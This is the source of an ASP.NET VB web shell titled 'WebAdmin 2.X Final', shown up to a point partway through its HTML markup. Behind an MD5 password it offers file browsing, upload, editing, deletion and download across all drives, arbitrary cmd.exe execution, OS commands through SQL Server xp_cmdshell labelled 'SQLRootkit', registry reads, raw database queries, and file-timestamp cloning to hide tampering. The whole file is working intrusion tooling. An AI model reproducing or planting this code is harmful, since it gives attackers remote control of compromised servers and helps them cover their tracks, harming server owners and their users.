<%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
<%@ import Namespace="System.IO" %>
<%@ import Namespace="System.Diagnostics" %>
<%@ import Namespace="Microsoft.Win32" %>
<%@ import Namespace="System.Data" %>
<%@ import Namespace="System.Data.OleDb" %>
<script runat="server">

    '---------Setting Start---------
    'Here, modify the default password to yours, MD5 Hash
    Const PASSWORD as string = "21232f297a57a5a743894a0e4a801fc3"
    'Session name, avoid session crash
    Const SESSIONNAME as string = "webadmin2"
    '---------Setting End---------
    
    Dim SORTFILED As String
    
    Sub Page_load(sender As Object, E As EventArgs)
      Dim error_x as Exception
      Try
        If Session(SESSIONNAME) = 0 Then
            ShowLogin()
        Else
            ShowMain()
            If not IsPostBack Then
                Select Case Request("action")
                    Case "goto"
                        CDir.Text = Request("src")
                        Call ShowFolders(CDir.Text)
                    Case "copy"
                        Call ShowCopy(Request("src"))
                    Case "cut"
                        Call ShowCut(Request("src"))
                    Case "down"
                        Call DownLoadIt(Request("src"))
                    Case "edit"
                        Call ShowEdit(Request("src"))
                    Case "del"
                        Call ShowDel(Request("src"))
                    Case "rename"
                        Call ShowRn(Request("src"))
                    Case "att"
                        Call ShowAtt(Request("src"))
                End Select
            End If
        End If
      Catch error_x
            ShowError(error_x.Message)
      End Try
    End Sub
    
    Sub Login_click(sender As Object, E As EventArgs)
        Dim MD5Pass As String = LCase(FormsAuthentication.HashPasswordForStoringInConfigFile(UPass.Text, "MD5"))
        If MD5Pass=PASSWORD Then
            Session(SESSIONNAME) = 1
            Call ShowMain()
        Else
            Label_Info.Text = "<b>NO, no, you don't my ÀÇ</b>"
        End If
    End Sub
    
    Sub GoTo_click(sender As Object, E As EventArgs)
        ULOGIN.Visible= False
        MAIN.Visible = True
        FileManager.Visible = True
        CMD.Visible = false
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
        Call ShowFolders(CDir.Text)
    End Sub
    
    Sub ShowError(ErrorMsg As String)
        Label_Info.Text = "<font color=""red""><b>Wrong: </b></font>" & ErrorMsg
    End Sub
    
    Sub ShowMain()
        Label_Info.Text = "»¶Ó­¹âÁÙ¡ª¡ª²ÔÀÇ°Ý·Ã !"
        ULOGIN.Visible = False
        MAIN.Visible = True
    End Sub
    
    Sub ShowDrives()
        Label_Drives.Text = "Go To : "
        Label_Drives.Text += "<a href=""?action=goto&src=" & Server.URLEncode(Server.MapPath(".")) & """> . </a> "
        Label_Drives.Text += "<a href=""?action=goto&src=" & Server.URLEncode(Server.MapPath("/")) & """> / </a> "
        dim i as integer
        for i =0 to Directory.GetLogicalDrives().length-1
             Label_Drives.Text += "<a href=""?action=goto&src=" & Directory.GetLogicalDrives(i) & """>" & Directory.GetLogicalDrives(i) & " </a>"
        next
    End Sub
    
    Sub Logout_click(sender As Object, E As EventArgs)
        Session.Abandon()
        Label_Info.Text = "<b>Byebye !</b>"
        Call ShowLogin()
    End Sub
    
    Sub ShowFileM(sender As Object, E As EventArgs)
        ULOGIN.Visible= False
        MAIN.Visible = True
        FileManager.Visible = True
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
        If CDir.Text = "" Then
            CDir.Text = Server.MapPath(".")
        End If
        Call ShowFolders(CDir.Text)
    End Sub
    
    Sub ShowFolders(FPath As String)
      Dim error_x as Exception
      Try
         Call ShowDrives()
        If right(FPath,1)<>"\" Then
            FPath += "\"
        End If
    
        dim xdir as directoryinfo
           dim mydir as new DirectoryInfo(FPath)
           dim xfile as fileinfo
        Label_Files.Text = "<table width=""90%"" border=""0"" align=""center"">"
        Label_Files.Text += "<tr><td width=""40%""><b>Name</b></td><td width=""15%""><b>Size</b></td>"
        Label_Files.Text += "<td width=""20%""><b>ModifyTime</b></td><td width=""25%""><b>Operate</b></td></tr>"
        Label_Files.Text += "<tr><td><tr><td><a href='?action=goto&src="
        Dim tmp As String
        If Len(FPath) < 4 Then
            tmp = server.UrlEncode(FPath)
        Else
            tmp = server.UrlEncode(Directory.GetParent(Left(FPath,Len(FPath)-1)).ToString())
        End If
        Label_Files.Text += tmp & "'><i>|Parent Directory|</i></a></td></tr>"
        For each xdir in mydir.getdirectories()
            Label_Files.Text += "<tr><td>"
            dim filepath as string = server.UrlEncode(FPath  & xdir.name)
            Label_Files.Text += "<a href='?action=goto&src=" & filepath & "\" & "'>" & xdir.name & "</a></td>"
            Label_Files.Text += "<td><dir></td>"
            Label_Files.Text += "<td>" & Directory.GetLastWriteTime(FPath & "\" & xdir.name) & "</td>"
            Label_Files.Text += "<td><a href='?action=cut&src=" & filepath & "\'  target='_blank'>Cut" & "</a>|"
            Label_Files.Text += "<a href='?action=copy&src=" & filepath & "\'  target='_blank'>Copy</a>|"
            Label_Files.Text += "<a href='?action=rename&src=" & filepath & "' target='_blank'>Ren</a>|"
            Label_Files.Text += "<a href='?action=att&src=" & filepath & "\'" & "' target=_blank'>Att</a>|"
            Label_Files.Text += "<a href='?action=del&src=" & filepath & "\'" & "' target=_blank'>Del</a></td>"
            Label_Files.Text += "</tr>"
        Next
        Label_Files.Text += "</td></tr><tr><td>"
        For each xfile in mydir.getfiles()
            dim filepath2 as string
            filepath2=server.UrlEncode(FPath & xfile.name)
            Label_Files.Text += "<tr><td>" & xfile.name & "</td>"
            Label_Files.Text += "<td>" & GetSize(xfile.length) & "</td>"
            Label_Files.Text += "<td>" & file.GetLastWriteTime(FPath  & xfile.name) & "</td>"
            Label_Files.Text += "<td><a href='?action=edit&src=" & filepath2 & "' target='_blank'>Edit</a>|"
            Label_Files.Text += "<a href='?action=cut&src=" & filepath2 & "' target='_blank'>Cut</a>|"
            Label_Files.Text += "<a href='?action=copy&src=" & filepath2 & "' target='_blank'>Copy</a>|"
            Label_Files.Text += "<a href='?action=rename&src=" & filepath2 & "' target='_blank'>Ren</a>|"
            Label_Files.Text += "<a href='?action=down&src=" & filepath2 & "'>Down</a>|"
            Label_Files.Text += "<a href='?action=att&src=" & filepath2 & "' target=_blank'>Att</a>|"
            Label_Files.Text += "<a href='?action=del&src=" & filepath2 & "' target=_blank'>Del</a></td>"
            Label_Files.Text += "</tr>"
        Next
        Label_Files.Text += "</table>"
       Catch error_x
               ShowError(error_x.Message)
       End Try
    End Sub
    
    Function GetSize(temp)
          if temp < 1024 then
             GetSize=temp & " bytes"
          else
             if temp\1024 < 1024 then
                GetSize=temp\1024 & " KB"
             else
                if temp\1024\1024 < 1024 then
                       GetSize=temp\1024\1024 & " MB"
                else
                       GetSize=temp\1024\1024\1024 & " GB"
                end if
             end if
          end if
    End Function
    
    Sub ShowLogin()
        ULOGIN.Visible= True
        MAIN.Visible = False
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
    End Sub
    
    'Show Cmd
    Sub Button_showcmd_Click(sender As Object, E As EventArgs)
        ULOGIN.Visible = False
        MAIN.Visible = True
        FileManager.Visible = False
        CMD.Visible = True
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
    End Sub
    
    'Show clonetime
    Sub Button_showclone_Click(sender As Object, E As EventArgs)
        ULOGIN.Visible = False
        MAIN.Visible = True
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = True
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
    End Sub
    
    Sub Button_showcmdshell_Click(sender As Object, E As EventArgs)
        ULOGIN.Visible = False
        MAIN.Visible = True
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = True
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
    End Sub
    
    Sub Button_showinfo_Click(sender As Object, E As EventArgs)
        ULOGIN.Visible = False
        MAIN.Visible = True
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = True
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
        ServerIP.Text = request.ServerVariables("LOCAL_ADDR")
        MachineName.Text = Environment.MachineName
        UserDomainName.Text = Environment.UserDomainName.ToString()
        UserName.Text = Environment.UserName
        OS.Text = Environment.OSVersion.ToString()
        StartTime.Text = GetStartedTime(Environment.Tickcount) & "Hours"
        NowTime.Text = Now()
        IISV.Text = request.ServerVariables("SERVER_SOFTWARE")
        HTTPS.Text = request.ServerVariables("HTTPS")
        PATHS.Text = request.ServerVariables("PATH_INFO")
        PATHS2.Text = request.ServerVariables("PATH_TRANSLATED")
        PORT.Text = request.ServerVariables("SERVER_PORT")
        SID.Text = Session.SessionID
    End Sub
    
    Function GetStartedTime(ms)
          GetStartedTime=cint(ms/(1000*60*60))
    End function
    
    Sub ShowReg(Src As Object, E As EventArgs)
        ULOGIN.Visible = False
        MAIN.Visible = True
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = True
        DATA.Visible = False
        About.Visible = False
    End Sub
    
    Sub ShowData(Src As Object, E As EventArgs)
        ULOGIN.Visible = False
        MAIN.Visible = True
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = True
        About.Visible = False
    End Sub
    
    Sub ShowAbout(Src As Object, E As EventArgs)
        ULOGIN.Visible = False
        MAIN.Visible = True
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = True
    End Sub
    
    Sub ShowEdit( filepath as string)
        ULOGIN.Visible = False
        MAIN.Visible = false
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
        File_Edit.Visible = true
        edited_path.Text = filepath
        dim myread as new streamreader(filepath, encoding.default)
           edited_path.text = filepath
           edited_content.text=myread.readtoend
           myread.close()
    End Sub
    
    Sub ShowDel( filepath as string)
        MAIN.Visible = false
        FileManager.Visible = False
        File_del.Visible = True
        label_del.Text = "Are u sure delete file/Folder <b>" & filepath & "</b> ?"
    End Sub
    
    Sub ShowRn( filepath as string)
        MAIN.Visible = false
        FileManager.Visible = False
        File_Rename.Visible = True
        btn_rename.Text = path.getfilename(filepath)
    End Sub
    
    Sub RunCMD(Src As Object, E As EventArgs)
        Dim error_x as Exception
          Try
        Dim myProcess As New Process()
        Dim myProcessStartInfo As New ProcessStartInfo(cmdPath.Text)
        myProcessStartInfo.UseShellExecute = False
        myProcessStartInfo.RedirectStandardOutput = true
        myProcess.StartInfo = myProcessStartInfo
        myProcessStartInfo.Arguments = CMDCommand.text
        myProcess.Start()
        Dim myStreamReader As StreamReader = myProcess.StandardOutput
        Dim myString As String = myStreamReader.Readtoend()
        myProcess.Close()
        mystring=replace(mystring,"<","<")
        mystring=replace(mystring,">",">")
        CMDresult.text = "<pre>" & mystring & "</pre>"
          Catch error_x
               ShowError(error_x.Message)
          End Try
    End Sub
    
    Sub GoCloneTime(Src As Object, E As EventArgs)
          Dim error_x as Exception
          Try
          Dim thisfile As FileInfo =New FileInfo(time1.Text)
          Dim thatfile As FileInfo =New FileInfo(time2.Text)
          thisfile.LastWriteTime = thatfile.LastWriteTime
          thisfile.LastAccessTime = thatfile.LastAccessTime
          thisfile.CreationTime = thatfile.CreationTime
          Label_cloneResult.Text = "<font color=""red"">Clone Time Success!</font>"
          Catch error_x
               ShowError(error_x.Message)
          End Try
    End Sub
    
    Sub CMDSHELL(Src As Object, E As EventArgs)
            Dim error_x as Exception
          Try
            Dim adoConn,strQuery,recResult,strResult
                 adoConn=Server.CreateObject("ADODB.Connection")
                 adoConn.Open(ConStr.Text)
                 If Sqlcmd.Text<>"" Then
                    strQuery = "exec master.dbo.xp_cmdshell '" & Sqlcmd.Text & "'"
                        recResult = adoConn.Execute(strQuery)
                     If NOT recResult.EOF Then
                        Do While NOT recResult.EOF
                            strResult = strResult & chr(13) & recResult(0).value
                            recResult.MoveNext
                        Loop
                     End if
                     recResult = Nothing
                     strResult = Replace(strResult," ","&nbsp;")
                     strResult = Replace(strResult,"<","<")
                     strResult = Replace(strResult,">",">")
                    resultSQL.Text=SqlCMD.Text & vbcrlf & "<pre>" & strResult & "</pre>"
                 End if
                  adoConn.Close
           Catch error_x
               ShowError(error_x.Message)
          End Try
    End Sub
    
    Sub ReadReg(Src As Object, E As EventArgs)
              Dim error_x as Exception
        Try
              Dim hu As String = RegKey.Text
              Dim rk As RegistryKey
              Select Mid( hu ,1 , Instr( hu,"\" )-1 )
                 case "HKEY_LOCAL_MACHINE"
                    rk = Registry.LocalMachine.OpenSubKey( Right(hu , Len(hu) - Instr( hu,"\" )) , 0 )
                 case "HKEY_CLASSES_ROOT"
                    rk = Registry.ClassesRoot.OpenSubKey( Right(hu , Len(hu) - Instr( hu,"\" )) , 0 )
                 case "HKEY_CURRENT_USER"
                    rk = Registry.CurrentUser.OpenSubKey( Right(hu , Len(hu) - Instr( hu,"\" )) , 0 )
                 case "HKEY_USERS"
                    rk = Registry.Users.OpenSubKey( Right(hu , Len(hu) - Instr( hu,"\" )) , 0 )
                 case "HKEY_CURRENT_CONFIG"
                    rk = Registry.CurrentConfig.OpenSubKey( Right(hu , Len(hu) - Instr( hu,"\" )) , 0 )
              End Select
              RegResult.Text = rk.GetValue(RegValue.Text , "NULL")
              rk.Close()
        Catch error_x
              ShowError(error_x.Message)
        End Try
    End Sub
    
    Sub DB_onrB_1(sender As Object, E As EventArgs)
          DataCStr.Text = "server=127.0.0.1;UID=sa;PWD=;database=news;Provider=SQLOLEDB"
          Type_Acc.Checked = false
          Type_SQL.Checked = true
    End Sub
    
    Sub DB_onrB_2(sender As Object, E As EventArgs)
          Type_Acc.Checked = true
          Type_SQL.Checked = false
          DataCStr.Text = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\MyWeb\UpdateWebadmin\guestbook.mdb"
    End Sub
    
    Sub DB_Submit_Click(sender As Object, E As EventArgs)
          Dim error_x as Exception
          Try
          DB_eButton.Visible = True
          DB_eString.Visible = True
          DB_exe.Visible = True
          db_showTable.Text = "<br><b>The Tables :</b><br>"
          Dim i As Integer
          Dim db_conn As New OleDbConnection(DataCStr.Text)
          Dim db_schemaTable As DataTable
          db_conn.open()
          db_schemaTable = db_conn.GetOleDbSchemaTable(OleDbSchemaGuid.Tables, New Object() {Nothing, Nothing, Nothing, "TABLE"})
          For i = 0 To db_schemaTable.Rows.Count - 1
            db_showTable.Text += db_schemaTable.Rows(i)!TABLE_NAME.ToString & "<br>"
          Next i
          db_conn.close()
          Catch error_x
            ShowError(error_x.Message)
         End Try
    End Sub
    
    Sub DB_Page(sender As Object, e As System.Web.UI.WebControls.DataGridPageChangedEventArgs)
          DB_DataGrid.CurrentPageIndex = e.NewPageIndex
          Call BindData()
    End Sub
    
    Sub DB_Sort(sender As Object, E As DataGridSortCommandEventArgs)
          SORTFILED = E.SortExpression
          Call BindData()
    End Sub
    
    Sub DB_Exec_Click(sender As Object, E As EventArgs)
           DB_ExecRes.Text = ""
           If LCase(Left(DB_EString.Text, 6)) = "select" Then
                Call BindData()
           Else
                Call DB_Exec()
           End If
    End Sub
    
    Sub DB_Exec()
          Dim error_x as Exception
          Try
              Dim db_conn As New OleDbConnection(DataCStr.Text)
              Dim db_cmd As New OleDbCommand( DB_EString.Text , db_conn )
              db_conn.Open()
              db_cmd.ExecuteNonQuery()
              db_conn.Close()
              DB_ExecRes.Text = "<b>Done! </b>"
          Catch error_x
            ShowError(error_x.Message)
         End Try
    End Sub
    
    Function myGetTableName(SQLS As String)
        Dim TEMP, TEMP2 As String
        TEMP = Right(SQLs, Len(SQLS) - Instr(1, SQLs, "from", 1) - 3 )
        Dim i As Integer
        For i = 1 to Len(TEMP)
            If Mid(TEMP, i, 1) <> vbcrlf Then
                TEMP2 += Mid(TEMP, i, 1)
            Else
                Exit For
            End If
        Next
        myGetTableName = TEMP2
    End Function
    
    Sub BindData()
          Dim error_x as Exception
          Try
          Dim myTableName As String = myGetTableName(DB_EString.Text)
          Dim db_conn As New OleDbConnection(DataCStr.Text)
          Dim db_cmd As New OleDbCommand( DB_EString.Text , db_conn )
          Dim db_adp As New OleDbDataAdapter(db_cmd)
          Dim db_ds As New DataSet()
          db_adp.Fill(db_ds,myTableName)
          DB_DataGrid.DataSource = db_ds.Tables(myTableName).DefaultView
          db_ds.Tables(myTableName).DefaultView.Sort = SORTFILED
          DB_DataGrid.DataBind()
          Catch error_x
            ShowError(error_x.Message)
         End Try
    End Sub
    
       Sub DownLoadIt(thePath)
         Dim error_x as Exception
          Try
           dim stream
           stream=server.createObject("adodb.stream")
           stream.open
           stream.type=1
           stream.loadFromFile(thePath)
           response.addHeader("Content-Disposition", "attachment; filename=" & replace(server.UrlEncode(path.getfilename(thePath)),"+"," "))
           response.addHeader("Content-Length",stream.Size)
           response.charset="UTF-8"
           response.contentType="application/octet-stream"
           response.binaryWrite(stream.read)
           response.flush
           stream.close
           stream=nothing
           response.End()
         Catch error_x
            ShowError(error_x.Message)
         End Try
       End Sub
    
        sub FileEdit(Src As Object, E As EventArgs)
            Dim error_x as Exception
            Try
              dim mywrite as new streamwriter(edited_path.text, false, encoding.default)
              mywrite.write(edited_content.text)
              mywrite.close
              response.Write("<script>alert('Edit|Creat " & replace(edited_path.text,"\","\\") & " Success! Please refresh')</sc"&"ript>")
            Catch error_x
              ShowError(error_x.Message)
            End Try
        end sub
    
        sub FileDel(Src As Object, E As EventArgs)
            Call del( Request("src") )
        end sub
    
        Sub del(a as string)
              if right(a,1)="\" then
                 dim xdir as directoryinfo
                 dim mydir as new DirectoryInfo(a)
                 dim xfile as fileinfo
                 for each xfile in mydir.getfiles()
                    file.delete(a & xfile.name)
                 next
                 for each xdir in mydir.getdirectories()
                    call del(a & xdir.name & "\")
                 next
                 directory.delete(a)
              else
                 file.delete(a)
              end if
              response.Write("<script>alert('Delete " & replace(a,"\","\\") & " Success! Please refresh')</sc"&"ript>")
              response.Write("<script>location.href='JavaScript:self.close()';</sc"&"ript>")
        End Sub
    
    Sub rn_rn_Click(Src As Object, E As EventArgs)
       Dim error_x as Exception
          Try
        Rename( request("src"), Directory.GetParent(request("src")).ToString() & "\" & btn_rename.Text )
        response.Write("<script>alert('Rename Success! Please refresh')</sc"&"ript>")
        response.Write("<script>location.href='JavaScript:self.close()';</sc"&"ript>")
        Catch error_x
            ShowError(error_x.Message)
        End Try
    End Sub
    
    Sub NewFile(Src As Object, E As EventArgs)
       Dim error_x as Exception
        Try
        Dim temp As String
        If right(CDir.Text, 1) <> "\" Then
            temp = CDir.Text & "\"
        Else
            temp = CDir.Text
        End If
        dim mywrite as new streamwriter(temp & TextBox_FDName.Text, true, encoding.default)
        mywrite.close
        label_info.Text = "Create File Success !"
        Call ShowFolders(CDir.Text)
        TextBox_FDName.Text = ""
         Catch error_x
            ShowError(error_x.Message)
         End Try
    End Sub
    
    Sub NewFolder(Src As Object, E As EventArgs)
          Dim error_x as Exception
          Try
        Dim temp As String
        If right(CDir.Text, 1) <> "\" Then
            temp = CDir.Text & "\"
        Else
            temp = CDir.Text
        End If
        directory.createdirectory(temp & TextBox_FDName.Text)
        label_info.Text = "Create Folder Success !"
        Call ShowFolders(CDir.Text)
        TextBox_FDName.Text = ""
          Catch error_x
            ShowError(error_x.Message)
         End Try
    End Sub
    
    Sub UpLoad(Src As Object, E As EventArgs)
          Dim error_x as Exception
          Try
        Dim temp As String
        If right(CDir.Text, 1) <> "\" Then
            temp = CDir.Text & "\"
        Else
            temp = CDir.Text
        End If
          dim filename,loadpath as string
          filename = path.getfilename(UpFile.value)
          loadpath = temp & filename
          UpFile.postedfile.saveas(loadpath)
          label_info.Text = "Upload File Success !"
          Call ShowFolders(CDir.Text)
          Catch error_x
            ShowError(error_x.Message)
         End Try
    End Sub
    
    Sub ShowAtt(path As String)
        MAIN.Visible = false
        FileManager.Visible = False
        File_Att.Visible = True
        If (File.GetAttributes(path) And FileAttributes.Hidden) = FileAttributes.Hidden Then
            Hide.Checked = True
        End If
        If (File.GetAttributes(path) And FileAttributes.ReadOnly) = FileAttributes.ReadOnly Then
            onlyread.Checked = True
        End If
        If (File.GetAttributes(path) And FileAttributes.System) = FileAttributes.System Then
            sys.Checked = True
        End If
        If (File.GetAttributes(path) And FileAttributes.Archive) = FileAttributes.Archive Then
            Archive.Checked = True
        End If
    End Sub
    
        Sub SetAttributes( path As String)
            If onlyread.Checked = True Then
                File.SetAttributes(path, File.GetAttributes(path) Or FileAttributes.ReadOnly)
            Else
                If (File.GetAttributes(path) And FileAttributes.ReadOnly) = FileAttributes.ReadOnly Then
                    File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.ReadOnly)
                End If
            End If
            If Hide.Checked = True Then
                File.SetAttributes(path, File.GetAttributes(path) Or FileAttributes.Hidden)
            Else
                If (File.GetAttributes(path) And FileAttributes.Hidden) = FileAttributes.Hidden Then
                    File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.Hidden)
                End If
            End If
            If sys.Checked = True Then
                File.SetAttributes(path, File.GetAttributes(path) Or FileAttributes.System)
            Else
                If (File.GetAttributes(path) And FileAttributes.System) = FileAttributes.System Then
                    File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.System)
                End If
            End If
            If Archive.Checked = True Then
                File.SetAttributes(path, File.GetAttributes(path) Or FileAttributes.Archive)
            Else
                If (File.GetAttributes(path) And FileAttributes.Archive) = FileAttributes.Archive Then
                    File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.Archive)
                End If
            End If
            response.Write("<script>alert('Rename Success! Please refresh')</sc"&"ript>")
            response.Write("<script>location.href='JavaScript:self.close()';</sc"&"ript>")
        End Sub
    
    Sub Set_Att_Click(Src As Object, E As EventArgs)
        Dim error_x as Exception
        Try
            Call SetAttributes( request("Src") )
        Catch error_x
            ShowError(error_x.Message)
        End Try
    End Sub
    
    Sub ShowCopy(path As String)
        Session("FileAct") = "Copy"
        Session("Source") = path
        response.Write("<script>alert('File info have add the cutboard, go to target directory click plaste!')</sc"&"ript>")
        response.Write("<script>location.href='JavaScript:self.close()';</sc"&"ript>")
    End Sub
    
    Sub ShowCut(path As String)
        Session("FileAct") = "Cut"
        Session("Source") = path
        response.Write("<script>alert('File info have add the cutboard, go to target directory click plaste!')</sc"&"ript>")
        response.Write("<script>location.href='JavaScript:self.close()';</sc"&"ript>")
    End Sub
    
    Sub Plaste_Click(Src As Object, E As EventArgs)
        Dim error_x as Exception
        Try
        Dim tmp As String = Session("Source")
        Dim temp As String
        If right(CDir.Text, 1) <> "\" Then
            temp = CDir.Text & "\"
        Else
            temp = CDir.Text
        End If
        If Session("FileAct") = "Copy" Then
            if right(tmp, 1)="\" then
                directory.createdirectory(temp & Path.GetFileName(mid(tmp, 1, len(tmp)-1)))
                call copydir(tmp, temp & Path.GetFileName(mid(tmp, 1, len(tmp)-1)) & "\" )
            Else
                file.copy(tmp, temp & Path.GetFileName(tmp))
            End If
            response.Write("<script>alert('Copy success!');</s"&"cript>")
        ElseIf Session("FileAct") = "Cut" Then
            if right(tmp, 1)="\" then
                directory.move(tmp, temp & Path.GetFileName(mid(tmp, 1, len(tmp)-1)) & "\")
            Else
                file.move(tmp, temp & Path.GetFileName(tmp) )
            End If
            response.Write("<script>alert('Cut success!');</s"&"cript>")
            Call ShowFolders(CDir.Text)
        Else
            response.Write("<script>alert('Plaste Fail!');</s"&"cript>")
        End If
         Catch error_x
            ShowError(error_x.Message)
         End Try
    End Sub
    
    Sub copydir(a As String , b As String)
          dim xdir as directoryinfo
          dim mydir as new DirectoryInfo(a)
          dim xfile as fileinfo
          for each xfile in mydir.getfiles()
             file.copy(a & xfile.name,b & xfile.name)
          next
          for each xdir in mydir.getdirectories()
             directory.createdirectory(b & path.getfilename(a & xdir.name))
             call copydir(a & xdir.name & "\",b & xdir.name & "\")
          next
    End Sub

</script>
<html>
<head>
    <title>:: WebAdmin 2.X Final ::</title> <style type="text/css">BODY {
	COLOR: #0000ff; FONT-FAMILY: Verdana
}
TD {
	COLOR: #0000ff; FONT-FAMILY: Verdana
}
TH {
	COLOR: #0000ff; FONT-FAMILY: Verdana
}
BODY {
	FONT-SIZE: 14px; BACKGROUND-COLOR: #ffffff
}
A:link {
	COLOR: #0000ff; TEXT-DECORATION: none
}
A:visited {
	COLOR: #0000ff; TEXT-DECORATION: none
}
A:hover {
	COLOR: #ff0000; TEXT-DECORATION: none
}
A:active {
	COLOR: #ff0000; TEXT-DECORATION: none
}
.buttom {
	BORDER-RIGHT: #084b8e 1px solid; BORDER-TOP: #084b8e 1px solid; BORDER-LEFT: #084b8e 1px solid; COLOR: #ffffff; BORDER-BOTTOM: #084b8e 1px solid; BACKGROUND-COLOR: #719bc5
}
.TextBox {
	BORDER-RIGHT: #084b8e 1px solid; BORDER-TOP: #084b8e 1px solid; BORDER-LEFT: #084b8e 1px solid; BORDER-BOTTOM: #084b8e 1px solid
}
.style3 {
	COLOR: #ff0000
}
</style>
    <meta http-equiv="Content-Type" content="text/html" />
</head>
<body>
    <form method="post" enctype="multipart/form-data" runat="server">
        <asp:Label id="Label_Info" runat="server" enableviewstate="False"></asp:Label>
        <br />
        <br />
        <asp:Panel id="ULOGIN" runat="server" Wrap="False" ToolTip="Login">
            <asp:Label id="Label_Pwd" runat="server" enableviewstate="False">Password:</asp:Label>
            <asp:TextBox class="TextBox" id="UPass" runat="server" Wrap="False" TextMode="Password"></asp:TextBox>
            <asp:Button class="buttom" id="Button_Login" onclick="login_click" runat="server" ToolTip="Click here to login" Text="Login"></asp:Button>
        </asp:Panel>
        <asp:Panel id="MAIN" runat="server" Wrap="False" ToolTip="Main" Visible="False">
            <asp:Label id="Label_tools" runat="server" enableviewstate="False">Function:</asp:Label>
            <asp:Button class="buttom" id="Button_filemanager" onclick="ShowFileM" runat="server" Text="File" Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_cmd" onclick="Button_showcmd_Click" runat="server" Text="Command" Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_clonetime" onclick="Button_showclone_Click" runat="server" Text="CloneTime" Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_sqlcmd" onclick="Button_showcmdshell_Click" runat="server" Text="SQLRootkit" Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_sysinfo" onclick="Button_showinfo_Click" runat="server" Text=" SysInfo " Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_db" onclick="ShowData" runat="server" Text="Database" Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_reg" onclick="ShowReg" runat="server" Text="Regedit" Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_about" onclick="ShowAbout" runat="server" Text="About" Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_exit" onclick="Logout_click" runat="server" Text="Exit" Width="80px"></asp:Button>
            <hr />
        </asp:Panel>
        <asp:Panel id="FileManager" runat="server" Wrap="False" Width="100%">
            <asp:Label id="Label_Drives" runat="server" enableviewstate="False"></asp:Label>
            <br />
            <asp:Label id="Label_Dir" runat="server" enableviewstate="False">Currently Dir :</asp:Label>
            <asp:TextBox class="TextBox" id="CDir" runat="server" Wrap="False" Width="300px"></asp:TextBox>
            <asp:Button class="buttom" id="Button_GoTo" onclick="GoTo_click" runat="server" ToolTip="Go to the dir" Text=" Go "></asp:Button>
            <asp:Button id="PlasteButton" onclick="Plaste_Click" runat="server" Text="Plaste" CssClass="buttom"></asp:Button>
            <br />
            <asp:Label id="Label_oper" runat="server" enableviewstate="False">Operate:</asp:Label>
            <asp:TextBox class="TextBox" id="TextBox_FDName" runat="server" Wrap="False" Width="100px"></asp:TextBox>
            <asp:Button class="buttom" id="Button_NewF" onclick="NewFile" runat="server" Text="NewFile"></asp:Button>
            <asp:Button class="buttom" id="Button_NewD" onclick="NewFolder" runat="server" Text="NewDir"></asp:Button>
            <input class="TextBox" id="UpFile" type="file" name="upfile" runat="server" />
            <asp:Button class="buttom" id="Button_UpFile" onclick="UpLoad" runat="server" Text="UpLoad" EnableViewState="False"></asp:Button>
            <HT>
                <br />
                <asp:Label id="Label_files" runat="server" enableviewstate="False" font-size="XX-Small" width="800px"></asp:Label>
                </asp:Panel>
        <asp:Panel id="CMD" runat="server" Wrap="False" ToolTip="CMD" Visible="False" Width="380px">
            <asp:Label id="Label_cmdpath" runat="server" enableviewstate="False" width="100px">Program
            : </asp:Label>
            <asp:TextBox class="TextBox" id="CMDPath" runat="server" Wrap="False" Text="cmd.exe" Width="250px">c:\windows\system32\cmd.exe</asp:TextBox>
            <br />
            <asp:Label id="Label_cmd" runat="server" enableviewstate="False" width="100px">Arguments
            :</asp:Label>
            <asp:TextBox class="TextBox" id="CMDCommand" runat="server" Wrap="False" Width="250px">/c ver</asp:TextBox>
            <asp:Button class="buttom" id="Button_cmdRun" onclick="RunCMD" runat="server" Text="Run" EnableViewState="False"></asp:Button>
            <br />
            <asp:Label id="cmdResult" runat="server"></asp:Label>
        </asp:Panel>
        <asp:Panel id="CloneTime" runat="server" Wrap="False" ToolTip="Clone Time" Visible="False">
            <asp:Label id="Label_rework" runat="server">Rework File or Dir:</asp:Label>
